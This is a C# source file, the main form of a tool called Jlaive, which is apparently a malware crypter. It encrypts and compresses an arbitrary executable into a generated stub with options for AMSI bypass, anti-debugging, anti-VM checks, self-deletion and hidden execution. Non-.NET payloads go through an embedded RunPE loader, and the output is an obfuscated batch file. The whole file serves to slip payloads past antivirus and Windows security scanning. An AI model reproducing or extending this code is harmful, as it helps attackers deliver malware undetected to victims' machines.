using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.CSharp;

using static Jlaive.Utils;

namespace Jlaive
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void openButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            textBox1.Text = ofd.FileName;
        }

        private void buildButton_Click(object sender, EventArgs e)
        {
            Task.Factory.StartNew(Crypt);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            SettingsObject obj = Settings.Load();
            if (obj != null)
            {
                textBox1.Text = obj.inputFile;
                bypassAMSI.Checked = obj.amsiBypass;
                antiDebug.Checked = obj.antiDebug;
                antiVM.Checked = obj.antiVM;
                selfDelete.Checked = obj.selfDelete;
                hidden.Checked = obj.hidden;
                aesEncryption.Checked = obj.aes;
                xorEncryption.Checked = obj.xor;
                listBox1.Items.AddRange(obj.bindedFiles);
            }
            Task.Factory.StartNew(CheckVersion); // Comment out this line to disable version checking
            UpdateKeys(sender, e);
        }

        private void UpdateKeys(object sender, EventArgs e)
        {
            AesManaged aes = new AesManaged();
            key1.Text = Convert.ToBase64String(aes.Key);
            iv1.Text = Convert.ToBase64String(aes.IV);
            aes.Dispose();
            aes = new AesManaged();
            key2.Text = Convert.ToBase64String(aes.Key);
            iv6.Text = Convert.ToBase64String(aes.IV);
            aes.Dispose();
        }

        private void aesEncryption_CheckedChanged(object sender, EventArgs e)
        {
            if (aesEncryption.Checked) xorEncryption.Checked = false;
        }

        private void xorEncryption_CheckedChanged(object sender, EventArgs e)
        {
            if (xorEncryption.Checked) aesEncryption.Checked = false;
        }

        private void addFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            listBox1.Items.Add(ofd.FileName);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            SettingsObject obj = new SettingsObject();
            obj.inputFile = textBox1.Text;
            obj.amsiBypass = bypassAMSI.Checked;
            obj.antiDebug = antiDebug.Checked;
            obj.antiVM = antiVM.Checked;
            obj.selfDelete = selfDelete.Checked;
            obj.hidden = hidden.Checked;
            obj.aes = aesEncryption.Checked;
            obj.xor = xorEncryption.Checked;
            List<string> paths = new List<string>();
            foreach (string item in listBox1.Items) paths.Add(item);
            obj.bindedFiles = paths.ToArray();
            Settings.Save(obj);
            Environment.Exit(0);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            listBox1.Items.Remove(listBox1.SelectedItem);
        }

        private void Crypt()
        {
            buildButton.Enabled = false;
            tabControl1.SelectedTab = tabControl1.TabPages["outputPage"];
            listBox2.Items.Clear();

            Random rng = new Random();
            string _input = textBox1.Text;
            byte[] _key = Convert.FromBase64String(key1.Text);
            byte[] _iv = Convert.FromBase64String(iv1.Text);
            byte[] _stubkey = Convert.FromBase64String(key2.Text);
            byte[] _stubiv = Convert.FromBase64String(iv6.Text);
            bool _usexor = xorEncryption.Checked;
            if (!File.Exists(_input))
            {
                MessageBox.Show("Invalid input path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }

            Console.ForegroundColor = ConsoleColor.Gray;
            byte[] pbytes = File.ReadAllBytes(_input);
            bool isnetasm = IsAssembly(_input);

            if (!bypassAMSI.Checked)
            {
                DialogResult result = MessageBox.Show("\"Bypass AMSI\" is highly recommended. Continue anyways?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Exclamation);
                if (result != DialogResult.Yes)
                {
                    buildButton.Enabled = true;
                    return;
                }
            }

            if (isnetasm)
            {
                listBox2.Items.Add("Patching assembly...");
                pbytes = Patcher.Fix(pbytes);
            }

            listBox2.Items.Add("Encrypting payload...");
            byte[] payload_enc = Encrypt(Compress(pbytes), _stubkey, _stubiv, _usexor);

            listBox2.Items.Add("Creating stub...");
            string stub = StubGen.CreateCS(_stubkey, _stubiv, _usexor, bypassAMSI.Checked, antiDebug.Checked, antiVM.Checked, !isnetasm, rng);

            listBox2.Items.Add("Building stub...");
            string tempfile = Path.GetTempFileName();
            File.WriteAllBytes("payload.exe", payload_enc);
            if (!isnetasm)
            {
                byte[] runpedll_data = GetEmbeddedResource("Jlaive.Resources.runpe.dll");
                byte[] runpedll_enc = Encrypt(Compress(runpedll_data), _stubkey, _stubiv, _usexor);
                File.WriteAllBytes("runpe.dll", runpedll_enc);
            }
            CSharpCodeProvider csc = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll" }, tempfile)
            {
                GenerateExecutable = true,
                CompilerOptions = "/optimize",
                IncludeDebugInformation = false
            };
            parameters.EmbeddedResources.Add("payload.exe");
            if (!isnetasm) parameters.EmbeddedResources.Add("runpe.dll");
            foreach (string item in listBox1.Items) parameters.EmbeddedResources.Add(item);
            CompilerResults results = csc.CompileAssemblyFromSource(parameters, stub);
            if (results.Errors.Count > 0)
            {
                File.Delete("payload.txt");
                if (!isnetasm) File.Delete("runpe.dll");
                File.Delete(tempfile);
                List<string> errors = new List<string>();
                foreach (CompilerError error in results.Errors) errors.Add(error.ToString());
                MessageBox.Show($"Stub build errors:{Environment.NewLine}{string.Join(Environment.NewLine, errors)}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }
            byte[] stubbytes = File.ReadAllBytes(tempfile);
            File.Delete("payload.exe");
            if (!isnetasm) File.Delete("runpe.dll");
            File.Delete(tempfile);

            listBox2.Items.Add("Encrypting stub...");
            byte[] stub_enc = Encrypt(Compress(stubbytes), _key, _iv, _usexor);

            listBox2.Items.Add("Creating batch file...");
            string content = FileGen.CreateBat(_key, _iv, _usexor, hidden.Checked, selfDelete.Checked, rng);
            content += Convert.ToBase64String(stub_enc);

            listBox2.Items.Add("Writing output...");
            File.WriteAllText(Path.ChangeExtension(_input, "bat"), content, Encoding.ASCII);

            MessageBox.Show("Done!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            buildButton.Enabled = true;
        }

        private void CheckVersion()
        {
            try
            {
                WebClient wc = new WebClient();
                string latestversion = wc.DownloadString("https://raw.githubusercontent.com/ch2sh/Jlaive/main/version").Trim();
                wc.Dispose();
                if (File.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion"))
                {
                    string currentversion = File.ReadAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion").Trim();
                    if (currentversion != latestversion)
                    {
                        DialogResult result = MessageBox.Show($"Jlaive {currentversion} is outdated. Download {latestversion}?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Exclamation);
                        if (result == DialogResult.Yes)
                        {
                            Process.Start("https://github.com/ch2sh/Jlaive/releases/tag/" + latestversion);
                        }
                    }
                }
                File.WriteAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion", latestversion);
            }
            catch { }
        }
    }
}